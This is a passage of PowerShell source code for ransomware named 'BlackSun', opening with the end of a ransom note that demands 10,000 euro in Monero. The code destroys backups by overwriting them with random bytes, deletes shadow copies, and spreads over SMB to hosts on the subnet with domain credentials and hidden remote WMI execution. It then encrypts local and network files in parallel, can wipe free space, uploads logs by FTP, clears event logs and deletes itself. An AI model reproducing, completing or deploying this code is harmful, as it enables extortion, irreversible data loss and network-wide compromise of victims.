your data are however encrypted with SSL encryption, the only way to decrypt them is to have the decryption code and software.
don't try to decrypt the files by yourself, you will damage them and make the recovery impossible.

HOW CAN I GET THE DECRYPTION SOFTWARE?
To get the software you will have to pay a certain amount of money. (10.000 euro in Monero Cryptocurrency)
You need to contact us at this email: bsprj1020@protonmail.com and we will tell you how to pay. You have 10 days starting from now.
"@

			$strReadmeFileContent | Out-File -FilePath $strReadmeFile -Force
		}
	}
	[System.GC]::Collect()
}

function FillRandomBackup ()
{
	param(
		[Parameter(Mandatory = $true)]
		[ValidateNotNullOrEmpty()]
		[string]$strfilepath,
		[int]$sizeMB
	)

	### checks
	[System.GC]::Collect()
	if (-not (Test-Path -Path $strfilepath -PathType Leaf)) { return }
	$strfilepath = Get-Item $strfilepath
	try { [io.file]::OpenWrite($strfilepath).close() } catch { return }
	if ($null -eq $strfilepath) { return }
	if ($strfilepath.FullName -like "*BlackSun_README*") { return }
	if ($strfilepath.Length -le 10000) { return }
	### checks

	$bytes = ($sizeMB * 1024) * 1024
	[System.Security.Cryptography.RNGCryptoServiceProvider]$rng = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
	$rndbytes = New-Object byte[] $bytes
	$rng.GetBytes($rndbytes)
	[System.IO.File]::WriteAllBytes($strfilepath,$rndbytes)
	if (Test-Path -Path $strfilepath -PathType Leaf) { [System.IO.File]::WriteAllBytes($strfilepath,$rndbytes) }
}


function GetDrives ()
{
	Write-Host ""
	Write-Host "GETTING LOCAL DRIVES:"
	$arrLocalDrives = Get-WmiObject win32_logicaldisk -Filter { drivetype=3 } | Select-Object -ExpandProperty name
	foreach ($LocalDrive in $arrLocalDrives)
	{
		$LocalDrive = $LocalDrive + "\"
		$strnohOutPath = $env:TEMP + "\BlackSun_DRIVE_LOCAL_" + $LocalDrive.SubString(0,1)
		Write-Host "Found local drive" $LocalDrive "Writing Drive File:" $strnohOutPath
		Out-File $strnohOutPath
	}
	Write-Host ""
	Write-Host "GETTING REMOTE DRIVES:"
	$arrNetworkDrives = Get-WmiObject win32_logicaldisk -Filter "drivetype=4" | Select-Object -ExpandProperty name
	foreach ($RemoteDrive in $arrNetworkDrives)
	{
		$RemoteDrive = $RemoteDrive + "\"
		$strnohOutPath = $env:TEMP + "\BlackSun_DRIVE_REMOTE_" + $RemoteDrive.SubString(0,1)
		Write-Host "Found remote drive" $RemoteDrive "Writing Drive File:" $strnohOutPath
		Out-File $strnohOutPath
	}
}

function GetFiles ()
{
	param
	(

		[Parameter(Mandatory = $true,Position = 0)]
		[string]$strFilesPath,

		[Parameter(Mandatory = $true,Position = 1)]
		[string]$strFilesOnDriveFile,

		[Parameter(Mandatory = $true,Position = 2)]
		[string]$strBackupsOnDriveFile

	)
	$strTmpAllFiles = $env:TEMP + "\BlackSun_TMPALL"
	Write-Host "Getting files on:" $strFilesPath
	$libfilesregex = [string]::Join('|',$ArrFileExt)
	$libfilesregex1 = [string]::Join('|',$ArrBackups)
    $libfilesregex2 = [string]::Join('|',$ArrSkippedPaths)
	$dirstring = "dir /a-d /b /s " + $strFilesPath + " > " + $strTmpAllFiles
	cmd /u /c $dirstring

	Remove-Item -Force $strFilesOnDriveFile -ErrorAction SilentlyContinue
	try
	{
        foreach($line in [System.IO.File]::ReadLines($strTmpAllFiles,[system.text.encoding]::Unicode)) {
			if ($line -eq $null) { break }
			if ($line -notmatch $libfilesregex2) {
				if ($line -match $libfilesregex) 
                        {
                        $line | Out-File $strFilesOnDriveFile -Append utf8
                        continue
                        }
				if ($line -match $libfilesregex1)
                        { 
                        $line | Out-File $strBackupsOnDriveFile -Append utf8
                        continue
                        }
			}
		}
	}
	finally {
	}
    $line = $null
    [System.GC]::Collect()
	$reader.close()
}

function SplitWork () {
	param(
		[Parameter(Mandatory = $true)]
		[ValidateNotNullOrEmpty()]
		[string]$FileListPath
	)

		#counting files
	    $measure = Get-Content $FileListPath | Measure-Object
	    $intTotalCount = $measure.Count


	if ($intTotalCount -gt 2) {
		#counting cores / workers
		$intCoresCount = (Get-CimInstance Win32_ComputerSystem).NumberOfLogicalProcessors

		$intWorkersCount = $intCoresCount

		if ($intCoresCount -eq "-1") { $intWorkersCount = 2 }
		if ($intCoresCount -eq 0) { $intWorkersCount = 2 }
		if ($intCoresCount -eq 1) { $intWorkersCount = 2 }
		if ($intTotalCount -le 30) { $intWorkersCount = 1 }

		$intFilesPerWorker = [math]::Round($intTotalCount / $intWorkersCount)

		Write-Host "FileList:" $FileListPath
		Write-Host "FileCount:" $intTotalCount
		Write-Host "CoreCount:" $intCoresCount
		Write-Host "Workers:" $intWorkersCount
		Write-Host "FilePerWorker:" $intFilesPerWorker
		Write-Host ""

		$x = @(0)
		$i = 1

		do {
			$x += $x[$i - 1] + $intFilesPerWorker
			$i++
		} while ($i -le $intWorkersCount)

		for ($i = 0; $i -lt $x.Count - 1; $i++)
		{
			$StartLine = $x[$i]
			$EndLine = $x[$i + 1]
			start-Job -ScriptBlock $DoEnc -ArgumentList ($FileListPath, $x[$i], $x[$i+1])
			#Invoke-Command -ScriptBlock $DoEnc -ArgumentList ($FileListPath,$x[$i],$x[$i + 1])
			Write-Host "Job Started, parameters:" $FileListPath","$StartLine","$EndLine
		}

	}
}

function getAliveSmb ()
{
	param([string]$Computer = '.',[int]$Port = 445,[int]$Millisecond = 1000)
	$Test = New-Object -TypeName Net.Sockets.TcpClient
	($Test.BeginConnect($Computer,$Port,$Null,$Null)).AsyncWaitHandle.WaitOne($Millisecond)
	$Test.close()
}

####################FUNCTIONS####################

####################CODE####################

#check if prev instance is already running
$strScriptName = $MyInvocation.MyCommand.Name
Test-IfAlreadyRunning -ScriptName $strScriptName

#Enable BitShift
Enable-BitShift

Write-Host ""
$CurrTime = Get-Date
Write-Host "BlackSun started:" $CurrTime
Write-Host ""
Write-Host "ENVIRONMENT VARIABLES"
Write-Host "************************************************************************"
Write-Host "My Directory:" $strMyDir
Write-Host "Logfile:" $strLogFile
Write-Host "************************************************************************"
Write-Host ""
$strPrevFiles = $env:TEMP + "\BlackSun_*"
$strPrevLogFiles = $env:TEMP + "\BlackSun*.log"

Write-Host "MAINTENANCE:"
Write-Host "Cleaning previous execution files on:" $strPrevFiles " , " $strPrevLogFiles
Remove-Item -Force $strPrevFiles -ErrorAction SilentlyContinue
Remove-Item -Force $strPrevLogFiles -ErrorAction SilentlyContinue

Write-Host ""
Write-Host "SEARCH AND ENCRYPT THESE:"
Write-Host ""
Write-Host $ArrFileExt
Write-Host ""
Write-Host "SEARCH AND DESTROY THESE:"
Write-Host ""
Write-Host $ArrBackups
Write-Host ""
Write-Host "SKIP THESE PATHS AND FILES:"
Write-Host ""
Write-Host $ArrSkippedPaths

if ($boolSafeRun -eq $true) { SafeRun; exit }

if ($boolNetworkPropagation -eq $true -and $intWinVer -ge 7) #skip propagation on older os
{
	Write-Host ""
	Write-Host "NETWORK PROPAGATION:"
	Write-Host ""
	$strMyIp = Get-WmiObject win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -eq $true } | ForEach-Object { $_.IPAddress } | ForEach-Object { [ipaddress]$_ } | Where-Object { $_.AddressFamily -eq 'Internetwork' } | ForEach-Object { $_.IPAddressToString }
	$classC = $strMyIp.Split(".")[0] + "." + $strMyIp.Split(".")[1] + "." + $strMyIp.Split(".")[2] + "."
	$arrAllIps = @()
	for ($i = 1; $i -lt 255; $i++)
	{
		$arrAllIps += $classC + $i.ToString()
	}

	#cached arp address
	$arrArpStale = Get-NetNeighbor -State Stale -addressfamily ipv4 | Select-Object -ExpandProperty ipaddress
	$arrArpReachable = Get-NetNeighbor -State Reachable -addressfamily ipv4 | Select-Object -ExpandProperty ipaddress

	#custom ranges
	for ($num = 0; $num -le $arrCustomSubnets.Count - 1; $num++)
	{
		$arrCustomIps = Get-NetworkRange $arrCustomSubnets[$num] | Select-Object -ExpandProperty IPAddressToString
	}

	#final array
	$arrAllIps = $arrAllIps + $arrArpStale + $arrArpReachable + $arrCustomIps
	$arrAllIps = $arrAllIps | Select-Object -Unique

	$Tasks = $arrAllIps | ForEach-Object { [System.Net.NetworkInformation.Ping]::new().SendPingAsync($_) }
	[Threading.Tasks.Task]::WaitAll($Tasks)

	$strAliveIps = ($Tasks.Result | Where-Object { $_.Status -eq "Success" } | Format-Table -HideTableHeaders Address) | Out-String
	$strAliveIps = $strAliveIps.Trim()
	$strAliveIps = $strAliveIps.Replace('\s','')
	$arrAliveIps = ($strAliveIps -split '\r?\n').Trim()

	foreach ($hostip in $arrAliveIps)
	{
		if (getAliveSmb ($hostip) -EQ $True)
		{
			if ($hostip -eq $strMyIp) { continue } #skip myself
			Write-Host "Host:" $hostip "is alive, trying to copy myself on remote host"
			Write-Host "Connecting to:" $hostip "on c$..."
			$strNetExePath = $env:windir + "\system32\net.exe"
			$strNetExeArgs = "use \\" + $hostip + "\c$ /USER:" + $strDomain + "\" + $strUsername + " " + $strPassword
			$strNetClean = $strNetExePath + " use \\" + $hostip + "\c$ /DELETE /y"

			$p = New-Object System.Diagnostics.Process
			$p.StartInfo.WindowStyle = "Hidden"
			$p.StartInfo.FileName = $strNetExePath
			$p.StartInfo.Arguments = $strNetExeArgs
			$p.Start()

			if (!$p.WaitForExit(7000))
			{ Write-Host "No response after 7 seconds from net use, skip"; $p.kill(); continue }

			$strDestination = "\\" + $hostip + "\c$\Windows\Temp\" + $strScriptName
			Write-Host "Source:" $strMySelf "Destination:" $strDestination
			if (Test-Path -Path $strDestination -PathType Leaf) { Write-Host "file already exist, skip"; Invoke-Expression $strNetClean; continue }
			Copy-Item -Force -Path $strMySelf -Destination $strDestination
			if (-not $?)
			{
				Write-Host "Copy failed, skip host"
				Write-Host ""
				Invoke-Expression $strNetClean
				continue
			}
			Write-Host "Copy ok, executing on remote"
			$run = "powershell.exe -ExecutionPolicy bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -File c:\Windows\Temp\" + $strMyName
			$secpass = ConvertTo-SecureString $strPassword -AsPlainText -Force
			$useranddomain = $strDomain + "\" + $strUsername
			$DomainCreds = New-Object System.Management.Automation.PSCredential ($useranddomain,$secpass)
			Write-Host "Executing:" $run
			Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList $run -ComputerName $hostip -Credential $DomainCreds
			Write-Host ""
			Invoke-Expression $strNetClean
		}
	}
}


GetDrives

Write-Host ""
Write-Host "GETTING FILES:"

$strRemoteDrivesFiles = $env:TEMP + "\BlackSun_DRIVE_REMOTE*"
$arrRemoteDrives = Get-ChildItem -Force -Path $strRemoteDrivesFiles | Select-Object -ExpandProperty Fullname

foreach ($strRemoteDriveFile in $arrRemoteDrives)
{
	$strDriveLetter = $strRemoteDriveFile.SubString($strRemoteDriveFile.get_Length() - 1)
	$strDrivePath = $strDriveLetter + ":\"
	$strFilesOnDriveFile = $env:TEMP + "\BlackSun_FILESON_REMOTE_" + $strDriveLetter
	$strBackupOnDriveFile = $env:TEMP + "\BlackSun_BACKUPS_REMOTE_" + $strDriveLetter
	GetFiles $strDrivePath $strFilesOnDriveFile $strBackupOnDriveFile
}

$strLocalDrivesFiles = $env:TEMP + "\BlackSun_DRIVE_LOCAL*"
$arrLocalDrives = Get-ChildItem -Force -Path $strLocalDrivesFiles | Select-Object -ExpandProperty Fullname

foreach ($strLocalDriveFile in $arrLocalDrives)
{
	$strDriveLetter = $strLocalDriveFile.SubString($strLocalDriveFile.get_Length() - 1)
	$strDrivePath = $strDriveLetter + ":\"
	$strFilesOnDriveFile = $env:TEMP + "\BlackSun_FILESON_LOCAL_" + $strDriveLetter
	$strBackupOnDriveFile = $env:TEMP + "\BlackSun_BACKUPS_LOCAL_" + $strDriveLetter
	GetFiles $strDrivePath $strFilesOnDriveFile $strBackupOnDriveFile
}

if ($boolEncryptGivenTime -eq $true) { DoWaitUntil }

Write-Host ""
Write-Host "RESTORE PREVENTION:"
DoCleanShadows
Write-Host ""
Write-Host "BACKUP PREVENTION:"
StopServices

Write-Host ""
Write-Host "DESTROYING REMOTE BACKUPS:"

$strFileListsDir = $env:TEMP + "\BlackSun_BACKUPS_REMOTE_*"
$arrFilesList = Get-ChildItem -Force -Path $strFileListsDir | Select-Object -ExpandProperty Fullname

foreach ($strFileList in $arrFilesList)
{
	DoDestroyBackup -FileListPath $strFileList
}

Write-Host ""
Write-Host "DESTROYING LOCAL BACKUPS:"

$strFileListsDir = $env:TEMP + "\BlackSun_BACKUPS_LOCAL_*"
$arrFilesList = Get-ChildItem -Force -Path $strFileListsDir | Select-Object -ExpandProperty Fullname

foreach ($strFileList in $arrFilesList)
{
	DoDestroyBackup -FileListPath $strFileList
}

Write-Host ""

if ($boolManualFileList -eq $true) {
	Write-Host ""
	Write-Host "ENCRYPTING MANUAL FILES LIST:"
	$strFileListsDir = $env:TEMP + "\BlackSun_FILESON_CUSTOM"
	$ArrManualFileList | Out-File $strFileListsDir
	$arrFilesList = Get-ChildItem -Force -Path $strFileListsDir | Select-Object -ExpandProperty Fullname

	foreach ($strFileList in $arrFilesList)
	{
		SplitWork -FileListPath $strFileList
	}

	Write-Host ""
	Get-Job | Wait-Job
}

Write-Host ""
Write-Host "ENCRYPTING REMOTE FILES:"
Write-Host ""
$strFileListsDir = $env:TEMP + "\BlackSun_FILESON_REMOTE_*"
$arrFilesList = Get-ChildItem -Force -Path $strFileListsDir | Select-Object -ExpandProperty Fullname

foreach ($strFileList in $arrFilesList)
{
	SplitWork -FileListPath $strFileList
}

Write-Host ""
Get-Job | Wait-Job

Write-Host ""
Write-Host "ENCRYPTING LOCAL FILES:"
Write-Host ""

$strFileListsDir = $env:TEMP + "\BlackSun_FILESON_LOCAL_*"
$arrFilesList = Get-ChildItem -Force -Path $strFileListsDir | Select-Object -ExpandProperty Fullname
foreach ($strFileList in $arrFilesList)
{
	SplitWork -FileListPath $strFileList
}

Write-Host ""
Get-Job | Wait-Job

Write-Host ""
Write-Host "RESTORE PREVENTION:"
DoCleanShadows
Write-Host ""

if ($boolWipeLocalDrives -eq $true) {

	Write-Host "WIPE FREE SPACE ON LOCAL DRIVES:"
	foreach ($strLocalDriveFile in $arrLocalDrives)
	{
		$strDriveLetter = $strLocalDriveFile.SubString($strLocalDriveFile.get_Length() - 1)
		$strDriveLetter = $strDriveLetter + ":\"
		WipeFreeSpace -strDrive $strDriveLetter
	}
}


if ($boolSetWallPaper -eq $true) { SetBsunWall }

if ($boolFtpLogUpload -eq $true) {
	$compress = @{
		LiteralPath = $strLogFile
		CompressionLevel = "Fastest"
		DestinationPath = $strZipLogFile
	}
	Compress-Archive @compress
	FtpUpload -ftpFile $strZipLogFile
}

write-host ""
write-host "Clean Event Logs.."
Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log } -ErrorAction SilentlyContinue
[System.GC]::Collect()

$CurrTime = Get-Date
Write-Host "BlackSun finished:" $CurrTime

Stop-Transcript

if ($strMyDir -eq "c:\Windows\temp\") { remove-item -Path $MyInvocation.MyCommand.Source -ErrorAction SilentlyContinue}

####################CODE####################

exit
